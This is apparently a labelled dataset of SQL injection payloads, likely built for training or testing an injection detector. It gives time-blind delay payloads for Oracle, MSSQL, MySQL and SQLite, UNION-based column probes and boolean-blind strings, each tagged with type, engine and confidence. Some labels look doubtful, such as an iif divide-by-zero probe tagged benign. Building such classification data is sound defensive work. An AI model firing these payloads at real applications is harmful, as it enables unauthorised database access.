id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
22970,"1 where 7642 = 7642 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
22971,"1%"" ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ""%"" = """,time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
23059,"1' in boolean mode ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) #",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
23125,"1"" ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
22948,"1'|| ( select 'tkmc' from dual where 9675 = 9675 union all select null,null,null,null--",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
22960,"iif ( 8213 = 4718,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
22967,"-9577'|| ( select 'vloa' from dual where 7184 = 7184 union all select 7184,7184#",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
23007,"iif ( 1746 = 1730,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
23015,1 waitfor delay '0:0:5',time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
23021,1' ) ) waitfor delay '0:0:5' and ( ( 'bbqk' = 'bbqk,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
23045,1' waitfor delay '0:0:5',time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
23052,1' waitfor delay '0:0:5' and 'vwuz' = 'vwuz,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
23082,waitfor delay '0:0:5' and 'gsvt' = 'gsvt,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
23102,1' where 6035 = 6035 waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
23113,"1' where 3425 = 3425 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
23137,1%' ) ) waitfor delay '0:0:5' and ( ( '%' = ',time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
22952,1' ) ) ) and 1743 = 6793 and ( ( ( 'rgcv' = 'rgcv,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 49 chars.,2
22965,1' and 7533 = 7533,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 18 chars.,2
22966,-4775' ) or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
22969,-6327' ) ) union all select 2685--,union_based,generic,0.7,UNION-based payload detected. Payload length: 34 chars.,2
22973,1' ) as epgz where 2898 = 2898 and 7028 = 2287#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 47 chars.,2
22976,"1"" ) ) union all select null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 30 chars.,2
22978,-5970' where 2769 = 2769 union all select 2769--,union_based,generic,0.7,UNION-based payload detected. Payload length: 48 chars.,2
22979,"1 where 4944 = 4944 union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 82 chars.,2
22993,"1%' ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 73 chars.,2
23003,"1%"" ) ) union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
23011,-3938%' ) ) ) or 2034 = 7209#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 29 chars.,2
23016,"-3250%"" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162--",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
23019,"1"" ) where 1700 = 1700 union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
23024,"-8159 where 2793 = 2793 union all select 2793,2793,2793,2793,2793#",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
23030,"1%' ) union all select null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 33 chars.,2
23032,"-7008' ) ) union all select 9080,9080,9080#",union_based,generic,0.7,UNION-based payload detected. Payload length: 43 chars.,2
23034,1' ) as lgex where 4068 = 4068 and 1378 = 9247--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 48 chars.,2
23040,"-7422"" union all select 9127,9127,9127,9127,9127,9127,9127,9127,9127,9127#",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
23041,"-4121%"" ) union all select 2659,2659,2659,2659,2659,2659,2659,2659--",union_based,generic,0.7,UNION-based payload detected. Payload length: 68 chars.,2
23043,"1 ) union all select null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 31 chars.,2
23044,"-5957 ) ) ) union all select 8485,8485,8485,8485,8485,8485,8485,8485,8485--",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
23054,"-1434' ) ) union all select 4734,4734,4734,4734,4734,4734,4734,4734,4734,4734#",union_based,generic,0.7,UNION-based payload detected. Payload length: 78 chars.,2
23058,"-1197"" ) ) as dfsy where 8857 = 8857 or 3038 = 3038",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 51 chars.,2
23060,"1"" ) ) ) union all select null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 31 chars.,2
23065,"-7887' ) union all select 9049,9049,9049,9049,9049,9049,9049,9049,9049,9049#",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,2
23066,"-8309'|| ( select 'qecl' where 8449 = 8449 union all select 8449,8449,8449,8449,8449,8449,8449--",union_based,generic,0.7,UNION-based payload detected. Payload length: 96 chars.,2
23067,"-7111 union all select 2409,2409,2409,2409,2409,2409#",union_based,generic,0.7,UNION-based payload detected. Payload length: 53 chars.,2
23070,"-3035"" ) union all select 7912,7912,7912#",union_based,generic,0.7,UNION-based payload detected. Payload length: 41 chars.,2
23071,"-3321"" where 1603 = 1603 union all select 1603,1603,1603,1603#",union_based,generic,0.7,UNION-based payload detected. Payload length: 62 chars.,2
23072,"1' ) ) as xuab where 4369 = 4369 union all select null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
23077,"-8073 ) ) ) union all select 4481,4481,4481,4481--",union_based,generic,0.7,UNION-based payload detected. Payload length: 50 chars.,2
23079,"-4319"" ) where 7534 = 7534 or 8246 = 3217",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 41 chars.,2
23080,"-6431"" ) ) union all select 2358,2358,2358,2358,2358,2358,2358,2358,2358,2358#",union_based,generic,0.7,UNION-based payload detected. Payload length: 78 chars.,2
23081,1' ) ) as pdrg where 5960 = 5960 and 9198 = 9198--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,2
23083,"-1947 union all select 7780,7780,7780,7780,7780,7780,7780,7780#",union_based,generic,0.7,UNION-based payload detected. Payload length: 63 chars.,2
23084,"-3116"" ) ) ) union all select 4600,4600,4600,4600--",union_based,generic,0.7,UNION-based payload detected. Payload length: 51 chars.,2
23087,"-3953 ) as wjjk where 6433 = 6433 or make_set ( 9354 = 9354,7185 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 69 chars.,2
23089,-7378' or 6872 = 6872 and 'bnmn' like 'bnmn,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 43 chars.,2
23096,"-1447"" union all select 3013,3013,3013,3013,3013,3013,3013--",union_based,generic,0.7,UNION-based payload detected. Payload length: 60 chars.,2
23100,"1"" union all select null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 36 chars.,2
23105,"1"" where 1765 = 1765 union all select null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 68 chars.,2
23108,1 and 8398 = 1891-- naov,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2
23109,"1'+ ( select vupb where 9575 = 9575 union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 104 chars.,2
23124,"1' ) where 6988 = 6988 union all select null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 81 chars.,2
23127,"1"" ) ) ) and 7533 = 7533 and ( ( ( ""alvd"" like ""alvd",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 52 chars.,2
23129,-5039 union all select 2114#,union_based,generic,0.7,UNION-based payload detected. Payload length: 28 chars.,2
23136,-1879%' ) ) or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2
23142,"1 ) ) ) union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 40 chars.,2
23101,1' in boolean mode ),benign,generic,0.5,. Payload length: 20 chars.,2
22964,"1%' ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( '%' = '",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
22980,"1 ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 8867 = 8867",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
22983,"1%' ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
22984,"1' ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
22986,"1' ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
22991,"1"" ) ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
22996,"1' and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'imqi' = 'imqi",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
22998,"1"" and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""fqeu"" like ""fqeu",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
23000,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'leps' like 'leps",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
23009,"1"" ) rlike sleep ( 5 ) #",time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
23013,"1"" ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ""xmrq"" = ""xmrq",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
23014,"1%"" rlike sleep ( 5 ) #",time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
23017,"1%' ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
23025,"1 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
